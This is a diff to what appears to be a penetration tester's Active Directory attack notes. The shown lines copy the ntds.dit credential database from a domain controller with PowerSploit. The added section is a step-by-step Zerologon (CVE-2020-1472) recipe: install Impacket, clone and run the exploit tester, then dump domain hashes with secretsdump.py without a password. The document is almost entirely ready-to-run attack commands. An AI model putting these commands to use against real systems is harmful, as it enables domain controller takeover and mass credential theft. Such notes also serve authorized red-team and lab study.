@@ -252,4 +252,21 @@ Get-NetDomainController
 Import-Module PowerSploit
 Invoke-NinjaCopy -Path C:\windows\ntds\ntds.dit -LocalDistination C:\ntds.dit -ComputerName <DC name>
 ls
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Zerologon CVE-2020-1472
+
+virtualenv --python python3.8 zerologon-virtualenv
+cd zerologon-virtualenv/bin
+source ./activate
+./pip3 install git+https://github.com/SecureAuthCorp/impacket.git
+cd ../..
+
+git clone https://github.com/dirkjanm/CVE-2020-1472.git
+cd CVE-2020-1472
+chmod 755 *.py
+./zerologon_tester.py <dc-name> <dc-ip>
+
+cd /root/zerologon-virtualenv/bin/
+secretsdump.py -no-pass -just-dc lab.corp/dc-1\$@192.168.0.20
 
